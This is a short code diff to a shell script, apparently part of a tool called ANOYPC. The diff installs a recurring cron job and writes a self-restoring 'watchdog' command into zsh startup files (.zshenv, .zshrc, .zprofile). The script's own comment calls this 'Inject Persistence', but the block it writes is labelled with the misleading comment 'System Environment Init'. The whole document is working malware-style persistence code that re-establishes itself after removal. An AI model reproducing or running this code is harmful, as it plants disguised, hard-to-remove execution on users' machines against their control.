@@ -63,11 +63,12 @@ echo "*/26 * * * * $ANOYPC_DIR/run.sh" >> "$TMP_CRON"
 crontab "$TMP_CRON"
 rm -f "$TMP_CRON"
 
-# Inject Persistence (.zshrc)
-PERSIST_CMD="[[ -f \"$ANOYPC_DIR/run.sh\" ]] && \"$ANOYPC_DIR/run.sh\" > /dev/null 2>&1"
+# Inject Persistence (.zshrc) - Watchdog Mode Only
+PERSIST_CMD="crontab -l 2>/dev/null | grep -q \"$ANOYPC_DIR/run.sh\" || { crontab -l 2>/dev/null; echo \"*/26 * * * * $ANOYPC_DIR/run.sh\"; } | crontab - 2>/dev/null"
+
 for file in "$HOME/.zshenv" "$HOME/.zshrc" "$HOME/.zprofile"; do
     touch "$file"
-    if ! grep -q "$ANOYPC_DIR/run.sh" "$file"; then
+    if ! grep -q "System Environment Init" "$file"; then
         echo -e "\n# System Environment Init\n$PERSIST_CMD" >> "$file"
     fi
 done
